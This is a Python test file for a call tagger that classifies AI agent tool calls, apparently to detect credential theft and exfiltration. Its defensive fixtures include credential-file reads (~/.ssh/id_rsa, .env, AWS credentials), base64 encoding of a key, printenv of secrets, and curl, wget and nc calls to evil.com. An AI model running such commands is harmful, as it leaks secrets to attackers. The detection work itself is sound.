"""Tests for avakill.core.call_tagger — behavioral classification for T4."""

from __future__ import annotations

from avakill.core.call_tagger import CallTagger
from avakill.core.models import ToolCall


def _make_call(tool: str, **kwargs: str) -> ToolCall:
    return ToolCall(tool_name=tool, arguments=dict(kwargs))


class TestCallTagger:
    def setup_method(self):
        self.tagger = CallTagger()

    # -- Tool-name based tags --

    def test_shell_exec_tag(self):
        tags = self.tagger.tag(_make_call("Bash", command="ls -la"))
        assert "shell_exec" in tags

    def test_shell_glob_pattern(self):
        tags = self.tagger.tag(_make_call("shell_execute", command="echo hi"))
        assert "shell_exec" in tags

    def test_file_read_tag(self):
        tags = self.tagger.tag(_make_call("Read", file_path="/tmp/foo.txt"))
        assert "file_read" in tags

    def test_glob_tool_read_tag(self):
        tags = self.tagger.tag(_make_call("Grep", pattern="TODO"))
        assert "file_read" in tags

    def test_network_transmit_tool(self):
        tags = self.tagger.tag(_make_call("WebFetch", url="https://example.com"))
        assert "network_transmit" in tags

    def test_file_delete_tool(self):
        tags = self.tagger.tag(_make_call("delete_file", file_path="/tmp/x"))
        assert "file_delete" in tags

    # -- Argument-content based tags --

    def test_credential_read_env_file(self):
        tags = self.tagger.tag(_make_call("Read", file_path="/home/user/.env"))
        assert "credential_read" in tags
        assert "secret_access" in tags

    def test_credential_read_ssh(self):
        tags = self.tagger.tag(_make_call("Read", file_path="/home/user/.ssh/id_rsa"))
        assert "credential_read" in tags
        assert "secret_access" in tags

    def test_credential_read_aws(self):
        tags = self.tagger.tag(_make_call("Read", file_path="~/.aws/credentials"))
        assert "credential_read" in tags
        assert "secret_access" in tags

    def test_credential_read_id_rsa(self):
        tags = self.tagger.tag(_make_call("Bash", command="cat id_rsa"))
        assert "credential_read" in tags

    def test_env_read_printenv(self):
        tags = self.tagger.tag(_make_call("Bash", command="printenv SECRET_KEY"))
        assert "env_read" in tags
        assert "secret_access" in tags

    def test_env_read_environ(self):
        cmd = "python -c 'import os; os.environ[\"KEY\"]'"
        tags = self.tagger.tag(_make_call("Bash", command=cmd))
        assert "env_read" in tags

    def test_encode_base64(self):
        tags = self.tagger.tag(_make_call("Bash", command="cat file | base64"))
        assert "encode" in tags

    def test_encode_xxd(self):
        tags = self.tagger.tag(_make_call("Bash", command="xxd file.bin"))
        assert "encode" in tags

    def test_encode_openssl_enc(self):
        tags = self.tagger.tag(_make_call("Bash", command="openssl enc -aes-256-cbc"))
        assert "encode" in tags

    def test_network_transmit_curl(self):
        tags = self.tagger.tag(_make_call("Bash", command="curl https://evil.com"))
        assert "network_transmit" in tags

    def test_network_transmit_wget(self):
        tags = self.tagger.tag(_make_call("Bash", command="wget https://evil.com/x"))
        assert "network_transmit" in tags

    def test_network_transmit_nc(self):
        tags = self.tagger.tag(_make_call("Bash", command="nc evil.com 4444"))
        assert "network_transmit" in tags

    def test_clipboard_write_pbcopy(self):
        tags = self.tagger.tag(_make_call("Bash", command="cat secret | pbcopy"))
        assert "clipboard_write" in tags

    def test_clipboard_write_xclip(self):
        tags = self.tagger.tag(_make_call("Bash", command="echo data | xclip"))
        assert "clipboard_write" in tags

    def test_file_delete_rm(self):
        tags = self.tagger.tag(_make_call("Bash", command="rm important_file"))
        assert "file_delete" in tags

    # -- Edge cases --

    def test_benign_call_no_tags(self):
        tags = self.tagger.tag(_make_call("Write", file_path="/tmp/out.txt", content="hello"))
        assert tags == frozenset()

    def test_multiple_tags(self):
        # Reading a credential file via shell
        tags = self.tagger.tag(_make_call("Bash", command="cat ~/.ssh/id_rsa | base64"))
        assert "shell_exec" in tags
        assert "credential_read" in tags
        assert "secret_access" in tags
        assert "encode" in tags

    def test_returns_frozenset(self):
        tags = self.tagger.tag(_make_call("Bash", command="echo hi"))
        assert isinstance(tags, frozenset)

    def test_secret_access_inferred_from_credential_read(self):
        tags = self.tagger.tag(_make_call("Read", file_path=".env"))
        assert "secret_access" in tags

    def test_secret_access_inferred_from_env_read(self):
        tags = self.tagger.tag(_make_call("Bash", command="printenv"))
        assert "secret_access" in tags
